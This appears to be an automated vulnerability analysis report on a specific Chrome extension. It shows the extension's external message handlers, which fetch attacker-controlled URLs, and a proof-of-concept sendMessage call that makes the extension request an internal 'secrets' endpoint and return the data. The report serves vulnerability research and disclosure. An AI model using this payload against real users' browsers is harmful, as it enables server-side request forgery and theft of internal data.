# CoCo Analysis: pnenhoomfmddepcbmmkpkbdoplmjohge

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pnenhoomfmddepcbmmkpkbdoplmjohge/opgen_generated_files/bg.js
Line 965 (chrome.runtime.onMessageExternal.addListener handling various cases)

**Code:**

```javascript
// Background script - Message handler (bg.js line 965+)
chrome.runtime.onMessageExternal.addListener((function(e,t,a){
  switch(e.evento){
    // ... many cases ...
    case"getdsft":xe(e,t,a);break;  // ← attacker can trigger this
    case"getmydgn":Pe(e,t,a);break;  // ← attacker can trigger this
    // ... more cases ...
  }
}))

// xe function - SSRF vulnerability
function xe(e,t,a){
  let r="?"+new URLSearchParams(e.filtro).toString();
  fetch(e.url+r,{  // ← e.url is attacker-controlled!
    method:"GET",
    headers:{"content-type":"application/json"}
  }).then(async e=>await e.json())
    .then(e=>(a({status:!0,item:e}),e))
    .catch(e=>{a({status:!1,error:e,item:null})})
}

// Pe function - SSRF vulnerability
function Pe(e,t,a){
  let r="?"+new URLSearchParams(e.filtro).toString();
  fetch(e.url+r,{  // ← e.url is attacker-controlled!
    method:"GET",
    headers:{"content-type":"application/json"}
  }).then(async e=>{
    try{return await e.json()}catch(e){return null}
  }).then(e=>(e&&200==e.code?a({status:!0,item:e}):
    a(e?{status:!0,error:{status:e.code},item:null}:{status:!1,error:null,item:null}),e))
    .catch(e=>{a({status:!1,error:e,item:null})})
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - External websites/extensions whitelisted in externally_connectable can send messages

**Attack:**

```javascript
// From any whitelisted domain (futsniperweb.com.br, www.ea.com/ea-sports-fc, etc.)
// Attacker sends external message to extension
chrome.runtime.sendMessage(
  'pnenhoomfmddepcbmmkpkbdoplmjohge',  // extension ID
  {
    evento: 'getdsft',  // or 'getmydgn'
    url: 'http://internal-server/admin/secrets',  // ← attacker-controlled URL
    filtro: { param: 'value' }
  },
  function(response) {
    console.log('SSRF response:', response);
    // Attacker receives response data via sendResponse callback
  }
);
```

**Impact:** Server-Side Request Forgery (SSRF) - Attacker can make the extension perform privileged cross-origin requests to arbitrary URLs (including internal networks, localhost, etc.) and receive the response data. This can be used to scan internal networks, access internal services, or exfiltrate data from endpoints the victim's browser can access.
